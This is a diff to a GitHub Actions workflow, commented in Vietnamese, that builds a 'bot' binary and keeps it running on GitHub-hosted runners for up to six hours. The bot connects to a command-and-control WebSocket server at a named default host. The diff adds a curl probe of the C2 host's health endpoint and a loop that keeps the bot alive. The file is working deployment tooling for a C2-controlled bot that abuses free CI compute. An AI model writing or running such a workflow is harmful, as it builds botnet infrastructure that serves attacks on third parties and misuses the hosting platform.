@@ -1,14 +1,16 @@
 name: Run Bot (Manual)
 
+# Chạy bot trên GitHub-hosted runner — KHÔNG cần Release.
+# Actions → Run Bot (Manual) → nhập C2 URL + số phút.
 on:
   workflow_dispatch:
     inputs:
       c2_url:
-        description: 'C2 WebSocket URL (wss://...)'
+        description: 'C2 WebSocket URL'
         required: true
         default: 'wss://bot.minhvuong.io.vn/ws/bot/'
       duration:
-        description: 'Run duration in minutes (max 360 = 6h)'
+        description: 'Thời gian chạy (phút, max 360)'
         required: true
         default: '360'
 
@@ -20,33 +22,60 @@ jobs:
       - uses: actions/checkout@v4
 
       - name: Install deps
-        run: sudo apt-get update && sudo apt-get install -y build-essential libssl-dev zlib1g-dev
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y build-essential libssl-dev zlib1g-dev
 
       - name: Build bot
         run: |
+          make -C src clean || true
           make -C src dynamic
           chmod +x src/bot
+          ls -la src/bot
 
-      - name: Run bot
+      - name: Connectivity check to C2
         run: |
-          DURATION=${{ github.event.inputs.duration }}
           C2_URL="${{ github.event.inputs.c2_url }}"
+          # Extract host for curl probe
+          HOST=$(echo "$C2_URL" | sed -E 's#^wss?://([^/:]+).*#\1#')
+          echo "C2 host: $HOST"
+          curl -skI --max-time 15 "https://${HOST}/health" || true
+          curl -sk --max-time 15 "https://${HOST}/health" || true
 
-          echo "[*] Starting bot for ${DURATION} minutes"
-          echo "[*] C2: ${C2_URL}"
-          echo "[*] Runner: $(uname -a)"
-          echo "[*] CPUs: $(nproc)"
-          echo "[*] RAM: $(free -h | grep Mem | awk '{print $2}')"
+      - name: Run bot (foreground)
+        env:
+          BOT_FOREGROUND: "1"
+          C2_URL: ${{ github.event.inputs.c2_url }}
+          DURATION: ${{ github.event.inputs.duration }}
+        run: |
+          set -e
+          echo "[*] C2: $C2_URL"
+          echo "[*] Duration: ${DURATION} min"
+          echo "[*] CPUs: $(nproc) | RAM: $(free -h | awk '/Mem:/{print $2}')"
 
-          # Run bot in background
-          ./src/bot "${C2_URL}" &
+          # Foreground mode: no double-fork, logs visible in Actions
+          ./src/bot --foreground "$C2_URL" &
           BOT_PID=$!
-          echo "[*] Bot PID: ${BOT_PID}"
+          echo "[*] PID=$BOT_PID"
+          sleep 5
+          if ! kill -0 $BOT_PID 2>/dev/null; then
+            echo "[!] Bot exited early — check C2 URL / TLS / firewall"
+            exit 1
+          fi
+          echo "[+] Bot still running after 5s"
 
-          # Wait for specified duration
-          sleep $((DURATION * 60))
+          # Keep job alive
+          SECS=$((DURATION * 60))
+          END=$((SECONDS + SECS))
+          while [ $SECONDS -lt $END ]; do
+            if ! kill -0 $BOT_PID 2>/dev/null; then
+              echo "[!] Bot died at t=${SECONDS}s"
+              exit 1
+            fi
+            sleep 30
+          done
 
-          echo "[*] Duration elapsed, stopping bot..."
+          echo "[*] Stopping..."
           kill $BOT_PID 2>/dev/null || true
           wait $BOT_PID 2>/dev/null || true
-          echo "[+] Bot stopped"
+          echo "[+] Done"
